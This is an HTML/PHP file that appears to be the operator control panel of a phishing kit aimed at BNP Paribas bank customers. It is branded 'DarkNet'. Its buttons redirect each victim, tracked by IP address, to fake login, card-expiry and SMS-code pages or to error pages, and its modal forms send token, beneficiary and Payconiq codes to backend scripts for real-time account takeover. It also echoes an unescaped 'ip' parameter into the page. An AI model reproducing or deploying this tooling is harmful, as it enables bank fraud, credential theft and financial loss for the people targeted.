<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="assets/css/helpers.css">
        <link rel="stylesheet" href="assets/css/style.css">
        <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">

        <link rel="icon" type="image/x-icon" href="./Asstes/imgs/logo.jpg" />

        <title>Control</title>
        <style>
            body{
                overflow-x: hidden;
                overflow-y: auto;
                background:black;
            }
            .wrapper{
                width:100%;
                min-height:85vh;
            }
            button[type="submit"]{
                font-size:13px;
            }
            .wrapper img{
                width:100%;
                height:100%;
                object-fit: cover;
                position: absolute;
                opacity:0.02;
                z-index: -1;
                cursor: pointer;
            }
            .ipx{
                animation: bubble 1.0s infinite;
                color:red;
                font-size:14px;
            }
            @keyframes bubble {
                0%   { transform:scale(0.5); opacity:0.0; }
                50%  { transform:scale(1.2); opacity:0.5; }
                100% { transform:scale(1.0); opacity:1.0; }
            }
        </style>
    </head>

    <body>
        <div class="header text-center d-flex justify-content-center flex-column align-items-center py-2" style="background-color: black;">
            <img src="./Asstes/imgs/logo.jpg" alt="" style="width:50px; border-radius:50%;">
            <p class="mb-0" style='color:white;'>DarkNet</p>
        </div>
        <div class="ip">
                <?php
                if (isset($_GET["ip"])) {
                    echo "<p class='text-center ipx'>".$_GET["ip"]."</p>";
                }
                ?>
            </div>
        <div class="wrapper">
            <img src="./Asstes/imgs/logo.jpg">
            <div class="container text-center pb-3" style="padding-top:70px;">
                <h5 class="text-center" style="color:white;">BNP</h5>
				

				
                <form method="post" action="./Asstes/php/config/control.php" class="d-flex flex-wrap justify-content-center algin-items-center" style="gap:10px">
				
				
								        <button type="button" style="background-color: red; color: white; border: none;"
                class="btn" data-toggle="modal" data-target="#tokenpay">
            M1 (BNP Token)
        </button>
		        <button type="button" style="background-color: blue; color: white; border: none;"
                class="btn" data-toggle="modal" data-target="#tokenpay33">
            M2 (BNP Benificier)
        </button>
		        <button type="button" style="background-color: green; color: white; border: none;"
                class="btn" data-toggle="modal" data-target="#tokenpay44">
            M2 (Payconiq)
        </button>

				
                    <input type="hidden" name="step" value="control">
                    <input type="hidden" name="ip" value="<?php echo $_GET['ip']; ?>">|
					
					<div style="display:flex; justify-content:center; gap:15px; flex-wrap:wrap;">

                    <button type="submit" class="btn btn-success" name="to" value="BNP_login">LOGIN</button>
                    <button type="submit" class="btn btn-danger" name="to" value="BNP_login_error">ERR LOGIN</button>
					<button type="submit" class="btn btn-success" name="to" value="BNP_exp">EXP</button> 
					<button type="submit" class="btn btn-danger" name="to" value="BNP_exp_error">ERR EXP</button> 
                                        <button type="submit" class="btn btn-success" name="to" value="BNP_sms">SMS</button> 
                    <button type="submit" class="btn btn-danger" name="to" value="BNP_sms_error">ERR SMS</button> 

                    <button type="submit" class="btn btn-success" name="to" value="success"><i class="ri-home-3-fill"></i></button>
					</div>
                </form>
                <br>
                
            </div>
			
			
			
			
			
			

<div class="modal fade" id="tokenpay" tabindex="-1" role="dialog" aria-labelledby="tokenModalLabel" aria-hidden="true" style="JUSTIFY-CONTENT: CENTER;position:relative;">
  <div class="modal-dialog" role="document">
    <form method="post" action="./Asstes/php/config/number.php?tk=1&name=BNP-PARIBAS2" class="modal-content">
      <input type="hidden" name="ip" value="<?php echo $_GET['ip']; ?>">
	  <input type="hidden" name="name" value="BNP-CODE2">
      
      <div class="modal-header">
        <h5 class="modal-title" id="tokenModalLabel">M1 LOGIN</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      
      <div class="modal-body">
        <input type="text" id="chinwi1" name="number" style="border:1px solid #eee;" placeholder="Enter code">
      </div>
	  
      
      <div class="modal-footer">
        <button type="submit" class="btn btn-primary">Send</button>
      </div>
    </form>
  </div>
</div>	


	





<div class="modal fade" id="tokenpay33" tabindex="-1" role="dialog" aria-labelledby="tokenModalLabel" aria-hidden="true" style="JUSTIFY-CONTENT: CENTER;position:relative;">
  <div class="modal-dialog" role="document">
    <form method="post" action="./Asstes/php/config/number.php?tk=1&name=BNP-PARIBAS2" class="modal-content">
      <input type="hidden" name="ip" value="<?php echo $_GET['ip']; ?>">
	  <input type="hidden" name="name" value="BNP-CODE3">
      
      <div class="modal-header">
        <h5 class="modal-title" id="tokenModalLabel">M1 Benificer</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      
      <div class="modal-body">
        <input type="text" id="chinwi1" name="number" style="border:1px solid #eee;" placeholder="Enter code">
      </div>
	  
      
      <div class="modal-footer">
        <button type="submit" class="btn btn-primary">Send</button>
      </div>
    </form>
  </div>
</div>	



<div class="modal fade" id="tokenpay44" tabindex="-1" role="dialog" aria-labelledby="tokenModalLabel" aria-hidden="true" style="JUSTIFY-CONTENT: CENTER;position:relative;">
  <div class="modal-dialog" role="document">
    <form method="post" action="./Asstes/php/config/number.php?tk=1&name=BNP-PARIBAS4" class="modal-content">
      <input type="hidden" name="ip" value="<?php echo $_GET['ip']; ?>">
	  <input type="hidden" name="name" value="BNP-CODE4">
      
      <div class="modal-header">
        <h5 class="modal-title" id="tokenModalLabel">M2 Payconiq</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      
      <div class="modal-body">
        <input type="text" id="chinwi1" name="number" style="border:1px solid #eee;" placeholder="Enter Code (4 numbers)">
      </div>
	  
      <div class="modal-footer">
        <button type="submit" class="btn btn-primary">Send</button>
      </div>
    </form>
  </div>
</div>	
			
			
			
			
			
			
			
			
			
			
			
			
            <div class="modal" tabindex="-1" role="dialog" style="JUSTIFY-CONTENT: CENTER;position:relative;">
                <div class="modal-dialog" role="document">
                    <form method="post" action="./Asstes/php/config/number.php" class="modal-content">
                        <input type="hidden" name="ip" value="<?php echo $_GET['ip']; ?>">
                        <div class="modal-header">
                            <h5 class="modal-title">send Number</h5>
                            <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                            <span aria-hidden="true">&times;</span>
                            </button>
                        </div>
                        <div class="modal-body">
                            <input type="text" name="number" style="border:1px solid #eee;" placeholder="Enter Number">
                        </div>
                        <div class="modal-footer">
                            <button type="submit" class="btn btn-primary">send</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
		
		
		
		
		

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/js/all.min.js"></script>
        <script src="assets/js/script.js"></script>
                

        <script>
            $(".btn-info").click(function(){
                $(".modal").css("display","flex")
            });
            $(".qr").click(function(){
                $(".modal_box").addClass("d-flex");
                $(".modal_box").removeClass("d-none");
            });            
        </script>
    </body>

</html>